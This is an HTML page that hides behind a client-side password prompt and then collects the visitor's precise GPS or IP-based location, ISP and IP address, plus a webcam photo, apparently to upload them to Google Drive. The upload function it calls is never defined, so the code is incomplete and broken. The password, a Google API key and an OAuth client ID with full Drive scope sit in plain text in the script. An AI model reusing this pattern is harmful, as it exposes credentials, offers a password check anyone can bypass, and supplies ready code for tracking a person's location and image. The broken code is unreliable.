<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication Required</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            text-align: center;
            background: #0d1117;
            color: #ffffff;
            margin: 50px;
        }
        input, button {
            padding: 10px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            transition: 0.3s;
        }
        input {
            background: #161b22;
            color: #ffffff;
            outline: none;
            border: 1px solid #58a6ff;
        }
        button {
            background: #58a6ff;
            color: white;
            cursor: pointer;
            box-shadow: 0px 0px 10px #58a6ff;
        }
        button:hover {
            transform: scale(1.1);
            box-shadow: 0px 0px 20px #58a6ff;
        }
        #auth-section {
            animation: fadeIn 1s ease-in-out;
        }
        #main-content {
            display: none;
            animation: fadeIn 1s ease-in-out;
        }
        #status {
            font-size: 20px;
            font-weight: bold;
            animation: glow 1s infinite alternate;
            white-space: pre-line;
            text-align: left;
            max-width: 600px;
            margin: 20px auto;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes glow {
            from { color: #58a6ff; }
            to { color: #ffffff; }
        }
    </style>
</head>
<body>
    <div id="auth-section">
        <h2>üîí Enter Password to Access</h2>
        <input type="password" id="password" placeholder="Enter password">
        <button onclick="checkPassword()">Submit</button>
        <p id="auth-status" style="color: red;"></p>
    </div>

    <div id="main-content">
        <h1>üì° Saving Photo and Location to Google Drive...</h1>
        <p id="status">Initializing...</p>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>

    <!-- Load Google API -->
    <script src="https://apis.google.com/js/api.js"></script>
    <script>
        // Google API Configuration
        const CLIENT_ID = '683768306978-ngb6jn8lked8725dcqp8kgd6q13n6qab.apps.googleusercontent.com';
        const API_KEY = 'AIzaSyDPRolsAM6ntsJi-8BHSVLmA-O55V6Iw5A';
        const DISCOVERY_DOCS = ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"];
        const SCOPES = 'https://www.googleapis.com/auth/drive.file https://www.googleapis.com/auth/drive';

        // Function to Update Status on Web Page
        function updateStatus(message, isError = false) {
            const statusElement = document.getElementById("status");
            statusElement.style.color = isError ? "red" : "#58a6ff";
            statusElement.innerText += `${message}\n`;
        }

        // Password Check
        function checkPassword() {
            const enteredPassword = document.getElementById("password").value;
            const correctPassword = "Nipunapromod@1"; 

            if (enteredPassword === correctPassword) {
                updateStatus("‚úÖ Password correct.");
                document.getElementById("auth-section").style.display = "none";
                document.getElementById("main-content").style.display = "block";
                getLocation();
            } else {
                updateStatus("‚ùå Incorrect password!", true);
                document.getElementById("auth-status").innerText = "‚ùå Incorrect password!";
            }
        }

        // Get User Location (GPS or IP)
        function getLocation() {
            updateStatus("üìç Requesting GPS location...");
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const loc = `Latitude: ${lat}, Longitude: ${lng}`;
                    updateStatus(`‚úÖ GPS Location found: ${loc}`);
                    capturePhoto(loc);
                },
                (error) => {
                    updateStatus("‚ùå GPS access denied! Attempting IP-based location...", true);
                    getIPLocation();
                },
                { enableHighAccuracy: true, maximumAge: 0 }
            );
        }

        // Fallback to IP-Based Location
        async function getIPLocation() {
            updateStatus("üåê Fetching IP-based location...");
            try {
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();

                const loc = `üìç IP Location: ${data.city}, ${data.region}, ${data.country}\nüåç ISP: ${data.org}\nüî¢ IP: ${data.ip}`;
                updateStatus(`‚úÖ IP Location found: ${loc}`);
                capturePhoto(loc);
            } catch (error) {
                updateStatus("‚ùå Failed to get IP-based location.", true);
            }
        }

        // Capture Photo from Webcam
        async function capturePhoto(loc) {
            updateStatus("üì∏ Attempting to access camera...");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();
                video.onloadedmetadata = () => {
                    const canvas = document.getElementById("canvas");
                    const ctx = canvas.getContext("2d");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    stream.getTracks().forEach(t => t.stop());
                    updateStatus("‚úÖ Photo captured successfully.");
                    saveToDrive(canvas, loc);
                };
            } catch (error) {
                updateStatus("‚ùå Failed to access camera.", true);
            }
        }
    </script>
</body>
</html>
